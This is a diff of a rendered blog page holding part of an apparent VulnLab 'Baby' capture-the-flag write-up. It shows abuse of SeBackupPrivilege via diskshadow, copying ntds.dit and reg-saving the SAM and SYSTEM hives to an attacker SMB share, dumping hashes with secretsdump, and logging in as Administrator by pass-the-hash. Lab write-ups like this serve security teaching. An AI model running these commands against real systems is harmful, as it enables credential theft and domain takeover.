-</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a><span class="go">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                              </span>
-</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="go">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                              </span>
-</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="go">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                   </span>
-</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-30"><a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a><span class="go">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                  </span>
-</span><span id="__span-10-31"><a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-32"><a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a><span class="go">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                  </span>
-</span><span id="__span-10-33"><a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-34"><a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a><span class="go">BABY\it                                    Group            S-1-5-21-1407081343-4001094062-144464765  </span>
-</span><span id="__span-10-35"><a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a><span class="go">4-1109 Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-36"><a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a><span class="go">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                               </span>
-</span><span id="__span-10-37"><a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-38"><a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a><span class="go">Mandatory Label\High Mandatory Level       Label            S-1-16-12288  </span>
-</span><span id="__span-10-39"><a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a>
-</span><span id="__span-10-40"><a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a>
-</span><span id="__span-10-41"><a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a><span class="go">PRIVILEGES INFORMATION  </span>
-</span><span id="__span-10-42"><a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a><span class="go">----------------------  </span>
-</span><span id="__span-10-43"><a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a>
-</span><span id="__span-10-44"><a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a><span class="go">Privilege Name                Description                    State  </span>
-</span><span id="__span-10-45"><a id="__codelineno-10-45" name="__codelineno-10-45" href="#__codelineno-10-45"></a><span class="go">============================= ============================== =======  </span>
-</span><span id="__span-10-46"><a id="__codelineno-10-46" name="__codelineno-10-46" href="#__codelineno-10-46"></a><span class="go">SeMachineAccountPrivilege     Add workstations to domain     Enabled  </span>
-</span><span id="__span-10-47"><a id="__codelineno-10-47" name="__codelineno-10-47" href="#__codelineno-10-47"></a><span class="go">SeBackupPrivilege             Back up files and directories  Enabled  </span>
-</span><span id="__span-10-48"><a id="__codelineno-10-48" name="__codelineno-10-48" href="#__codelineno-10-48"></a><span class="go">SeRestorePrivilege            Restore files and directories  Enabled  </span>
-</span><span id="__span-10-49"><a id="__codelineno-10-49" name="__codelineno-10-49" href="#__codelineno-10-49"></a><span class="go">SeShutdownPrivilege           Shut down the system           Enabled  </span>
-</span><span id="__span-10-50"><a id="__codelineno-10-50" name="__codelineno-10-50" href="#__codelineno-10-50"></a><span class="go">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  </span>
-</span><span id="__span-10-51"><a id="__codelineno-10-51" name="__codelineno-10-51" href="#__codelineno-10-51"></a><span class="go">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  </span>
-</span><span id="__span-10-52"><a id="__codelineno-10-52" name="__codelineno-10-52" href="#__codelineno-10-52"></a>
-</span><span id="__span-10-53"><a id="__codelineno-10-53" name="__codelineno-10-53" href="#__codelineno-10-53"></a>
-</span><span id="__span-10-54"><a id="__codelineno-10-54" name="__codelineno-10-54" href="#__codelineno-10-54"></a><span class="go">USER CLAIMS INFORMATION  </span>
-</span><span id="__span-10-55"><a id="__codelineno-10-55" name="__codelineno-10-55" href="#__codelineno-10-55"></a><span class="go">-----------------------  </span>
-</span><span id="__span-10-56"><a id="__codelineno-10-56" name="__codelineno-10-56" href="#__codelineno-10-56"></a>
-</span><span id="__span-10-57"><a id="__codelineno-10-57" name="__codelineno-10-57" href="#__codelineno-10-57"></a><span class="go">User claims unknown.  </span>
-</span><span id="__span-10-58"><a id="__codelineno-10-58" name="__codelineno-10-58" href="#__codelineno-10-58"></a>
-</span><span id="__span-10-59"><a id="__codelineno-10-59" name="__codelineno-10-59" href="#__codelineno-10-59"></a><span class="go">Kerberos support for Dynamic Access Control on this device has been disabled.</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; whoami /all  </span>
+
+<span class="go">USER INFORMATION  </span>
+<span class="go">----------------  </span>
+
+<span class="go">User Name              SID  </span>
+<span class="go">====================== ==============================================  </span>
+<span class="go">baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111  </span>
+
+
+<span class="go">GROUP INFORMATION  </span>
+<span class="go">-----------------  </span>
+
+<span class="go">Group Name                                 Type             SID                                       </span>
+<span class="go">      Attributes  </span>
+<span class="go">========================================== ================ ========================================  </span>
+<span class="go">====== ==================================================  </span>
+<span class="go">Everyone                                   Well-known group S-1-1-0                                   </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Backup Operators                   Alias            S-1-5-32-551                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Users                              Alias            S-1-5-32-545                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                   </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                  </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                  </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BABY\it                                    Group            S-1-5-21-1407081343-4001094062-144464765  </span>
+<span class="go">4-1109 Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                               </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">Mandatory Label\High Mandatory Level       Label            S-1-16-12288  </span>
+
+
+<span class="go">PRIVILEGES INFORMATION  </span>
+<span class="go">----------------------  </span>
+
+<span class="go">Privilege Name                Description                    State  </span>
+<span class="go">============================= ============================== =======  </span>
+<span class="go">SeMachineAccountPrivilege     Add workstations to domain     Enabled  </span>
+<span class="go">SeBackupPrivilege             Back up files and directories  Enabled  </span>
+<span class="go">SeRestorePrivilege            Restore files and directories  Enabled  </span>
+<span class="go">SeShutdownPrivilege           Shut down the system           Enabled  </span>
+<span class="go">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  </span>
+<span class="go">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  </span>
+
+
+<span class="go">USER CLAIMS INFORMATION  </span>
+<span class="go">-----------------------  </span>
+
+<span class="go">User claims unknown.  </span>
+
+<span class="go">Kerberos support for Dynamic Access Control on this device has been disabled.</span>
+</code></pre></div>
 <p>Note the SeBackupPrivilege. We can abuse this using the method here: </p>
 <p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators">Privileged Groups | HackTricks</a></p>
 <p>I added the "X" to the end of each line because I found that the last character was getting stripped off in the next step.</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="go">set metadata C:\Windows\Temp\meta.cabX</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="go">set context clientaccessibleX</span>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="go">set context persistentX</span>
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="go">begin backupX</span>
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="go">add volume C: alias cdriveX</span>
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="go">createX</span>
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="go">expose %cdrive% F:X</span>
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="go">end backupX</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">set metadata C:\Windows\Temp\meta.cabX</span>
+<span class="go">set context clientaccessibleX</span>
+<span class="go">set context persistentX</span>
+<span class="go">begin backupX</span>
+<span class="go">add volume C: alias cdriveX</span>
+<span class="go">createX</span>
+<span class="go">expose %cdrive% F:X</span>
+<span class="go">end backupX</span>
+</code></pre></div>
 <p>Then I uploaded that to the <code>C:\Windows\Tasks</code> directory and executed it with:</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="go">diskshadow /s script.txt</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">diskshadow /s script.txt</span>
+</code></pre></div>
 <p>After running the script with diskshadow, we can see that we've successfully backed up the <code>C:\</code> drive.</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; diskshadow /s script.txt  </span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="go">Microsoft DiskShadow version 1.0  </span>
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="go">Copyright (C) 2013 Microsoft Corporation  </span>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="go">On computer:  BABYDC,  6/21/2024 12:37:10 PM  </span>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="go">-&gt; set metadata C:\Windows\Temp\meta.cab  </span>
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="go">-&gt; set context clientaccessible  </span>
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="go">-&gt; set context persistent  </span>
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="go">-&gt; begin backup  </span>
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="go">-&gt; add volume C: alias cdrive  </span>
-</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="go">-&gt; create  </span>
-</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="go">Alias cdrive for shadow ID {0925b2b9-cf5d-427d-9a6b-ba68992a63fc} set as environment variable.  </span>
-</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="go">Alias VSS_SHADOW_SET for shadow set ID {ed611205-454f-4713-9c5c-c41e3ca812e0} set as environment variable.  </span>
-</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>
-</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="go">Querying all shadow copies with the shadow copy set ID {ed611205-454f-4713-9c5c-c41e3ca812e0}  </span>
-</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>
-</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="go">       * Shadow copy ID = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}               %cdrive%  </span>
-</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="go">               - Shadow copy set: {ed611205-454f-4713-9c5c-c41e3ca812e0}       %VSS_SHADOW_SET%  </span>
-</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="go">               - Original count of shadow copies = 1  </span>
-</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="go">               - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]  </span>
-</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="go">               - Creation time: 6/21/2024 12:37:29 PM  </span>
-</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="go">               - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  </span>
-</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="go">               - Originating machine: BabyDC.baby.vl  </span>
-</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="go">               - Service machine: BabyDC.baby.vl  </span>
-</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="go">               - Not exposed  </span>
-</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="go">               - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}  </span>
-</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="go">               - Attributes:  No_Auto_Release Persistent Differential  </span>
-</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>
-</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="go">Number of shadow copies listed: 1  </span>
-</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a><span class="go">-&gt; expose %cdrive% F:  </span>
-</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a><span class="go">-&gt; %cdrive% = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}  </span>
-</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a><span class="go">The shadow copy was successfully exposed as F:\.  </span>
-</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a><span class="go">-&gt; end backup  </span>
-</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a><span class="go">-&gt;</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; diskshadow /s script.txt  </span>
+<span class="go">Microsoft DiskShadow version 1.0  </span>
+<span class="go">Copyright (C) 2013 Microsoft Corporation  </span>
+<span class="go">On computer:  BABYDC,  6/21/2024 12:37:10 PM  </span>
+
+<span class="go">-&gt; set metadata C:\Windows\Temp\meta.cab  </span>
+<span class="go">-&gt; set context clientaccessible  </span>
+<span class="go">-&gt; set context persistent  </span>
+<span class="go">-&gt; begin backup  </span>
+<span class="go">-&gt; add volume C: alias cdrive  </span>
+<span class="go">-&gt; create  </span>
+<span class="go">Alias cdrive for shadow ID {0925b2b9-cf5d-427d-9a6b-ba68992a63fc} set as environment variable.  </span>
+<span class="go">Alias VSS_SHADOW_SET for shadow set ID {ed611205-454f-4713-9c5c-c41e3ca812e0} set as environment variable.  </span>
+
+<span class="go">Querying all shadow copies with the shadow copy set ID {ed611205-454f-4713-9c5c-c41e3ca812e0}  </span>
+
+<span class="go">       * Shadow copy ID = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}               %cdrive%  </span>
+<span class="go">               - Shadow copy set: {ed611205-454f-4713-9c5c-c41e3ca812e0}       %VSS_SHADOW_SET%  </span>
+<span class="go">               - Original count of shadow copies = 1  </span>
+<span class="go">               - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]  </span>
+<span class="go">               - Creation time: 6/21/2024 12:37:29 PM  </span>
+<span class="go">               - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  </span>
+<span class="go">               - Originating machine: BabyDC.baby.vl  </span>
+<span class="go">               - Service machine: BabyDC.baby.vl  </span>
+<span class="go">               - Not exposed  </span>
+<span class="go">               - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}  </span>
+<span class="go">               - Attributes:  No_Auto_Release Persistent Differential  </span>
+
+<span class="go">Number of shadow copies listed: 1  </span>
+<span class="go">-&gt; expose %cdrive% F:  </span>
+<span class="go">-&gt; %cdrive% = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}  </span>
+<span class="go">The shadow copy was successfully exposed as F:\.  </span>
+<span class="go">-&gt; end backup  </span>
+<span class="go">-&gt;</span>
+</code></pre></div>
 <p>Once that's done, we can make a copy of the ntds.dit file using:</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="go">robocopy /B F:\Windows\NTDS . ntds.dit</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">robocopy /B F:\Windows\NTDS . ntds.dit</span>
+</code></pre></div>
 <p>Once that's copied, we can transfer it back over to the attacker machine. I set up an SMB server using <code>smbserver.py</code> for the transfer. </p>
 <p>On the target computer:</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="go">net use \\attacker-address\share /user:&lt;USER&gt; &lt;PASSWORD&gt;</span>
-</span></code></pre></div>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; copy ntds.dit \\10.8.2.86\pwnshare\ntds.dit</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">net use \\attacker-address\share /user:&lt;USER&gt; &lt;PASSWORD&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; copy ntds.dit \\10.8.2.86\pwnshare\ntds.dit</span>
+</code></pre></div>
 <p>After we have the ntds.dit file copied over to our attacker machine, we need to grab the SAM and SYSTEM hives as well. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; reg save HKLM\sam \\10.8.2.86\pwnshare\sam.sav</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="go">The operation completed successfully.</span>
-</span></code></pre></div>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; reg save HKLM\system \\10.8.2.86\pwnshare\system.sav</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="go">The operation completed successfully.</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; reg save HKLM\sam \\10.8.2.86\pwnshare\sam.sav</span>
+<span class="go">The operation completed successfully.</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; reg save HKLM\system \\10.8.2.86\pwnshare\system.sav</span>
+<span class="go">The operation completed successfully.</span>
+</code></pre></div>
 <p>Now that we have all these files on our attacker machine, we can run <code>secretsdump.py</code> to extract all the stored credentials.</p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="go">〉secretsdump.py -sam sam.sav -system system.sav -ntds ntds.dit LOCAL  </span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="go">Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra  </span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="go">[...SNIP...]</span>
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>
-</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="go">[*] Reading and decrypting hashes from ntds.dit    </span>
-</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::  </span>
-</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>
-</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="go">[...SNIP...]</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉secretsdump.py -sam sam.sav -system system.sav -ntds ntds.dit LOCAL  </span>
+<span class="go">Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra  </span>
+
+<span class="go">[...SNIP...]</span>
+
+<span class="go">[*] Reading and decrypting hashes from ntds.dit    </span>
+<span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::  </span>
+
+<span class="go">[...SNIP...]</span>
+</code></pre></div>
 <p>Now that we have all the stored credentials, we can just grab the domain admin's NT hash and log in to get the final flag. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="go">〉nxc smb $ip -u &#39;Administrator&#39; -H &#39;[REDACTED]&#39;  </span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (sig  </span>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="go">ning:True) (SMBv1:False)  </span>
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [+] baby.vl\Administrator:[REDACTED] (Pwn3d!)</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉nxc smb $ip -u &#39;Administrator&#39; -H &#39;[REDACTED]&#39;  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (sig  </span>
+<span class="go">ning:True) (SMBv1:False)  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [+] baby.vl\Administrator:[REDACTED] (Pwn3d!)</span>
+</code></pre></div>
 
-
-
-
-
-
-
+  <!-- Dynamic target input for pages that have the dynamic_target metadata -->
   
   
-
-
-
+  <!-- Source file information -->
+  
+  
+  <!-- Was this page helpful? -->
+  
   
 
 
@@ -1727,12 +2103,22 @@
               
                 
               
+              
+              
+                
+                
+              
               Thanks for your feedback!
             </div>
           
             <div data-md-value="0" hidden>
               
               
+                
+              
+              
+              
+                
                 
               
               Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
@@ -1743,14 +2129,110 @@
     </fieldset>
   </form>
 
+  
+  <!-- Tags -->
+  
+    
+  
 
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">backup</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">ldap</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">secretsdump</span>
+      
+    
+  </nav>
+
+  
+  
+  <!-- Actions -->
+  
+  
+  
+
+  
+  <!--
+    Hack: check whether the content contains a h1 headline. If it doesn't, the
+    page title (or respectively site name) is used as the main headline.
+    Checking for the needle `<h1` is not perfect, but it should be good enough
+    for now. Also note that we can't use `toc_tokens` as an indicator, since
+    the `toc` extension might be absent.
+  -->
+  
+  
+  
+  <!-- Navigation -->
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+
+      <!-- Link to previous page -->
+      
+        <a
+          href="../28/vulnlab-manage.html"
+          class="md-footer__link md-footer__link--prev"
+          aria-label="Previous: VulnLab: Manage"
+        >
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <span class="md-footer__direction">
+              Previous
+            </span>
+            <div class="md-ellipsis">
+              VulnLab: Manage
+            </div>
+          </div>
+        </a>
+      
+
+      <!-- Link to next page -->
+      
+        <a
+          href="../../07/04/vulnlab-retro.html"
+          class="md-footer__link md-footer__link--next"
+          aria-label="Next: VulnLab: Retro"
+        >
+          <div class="md-footer__title">
+            <span class="md-footer__direction">
+              Next
+            </span>
+            <div class="md-ellipsis">
+              VulnLab: Retro
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  
+  <!-- Comments -->
+  
   <h2 id="__comments">Comments</h2>
   <!-- Insert generated snippet here -->
   <script src="https://giscus.app/client.js"
         data-repo="tomfieber/tomfieber.github.io"
-        data-repo-id="R_kgDOPJlusg"
+        data-repo-id="R_kgDOPTkbBA"
         data-category="General"
-        data-category-id="DIC_kwDOPJluss4Cssx0"
+        data-category-id="DIC_kwDOPTkbBM4Ctdzl"
         data-mapping="pathname"
         data-strict="0"
         data-reactions-enabled="1"
@@ -1760,7 +2242,7 @@
         data-lang="en"
         crossorigin="anonymous"
         async>
-  </script>
+</script>
 
   <!-- Synchronize Giscus theme with palette -->
   <script>
@@ -1798,6 +2280,7 @@
     })
   </script>
 
+</article>
       
     </article>
   </div>
@@ -1884,7 +2367,7 @@
       
     
     <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
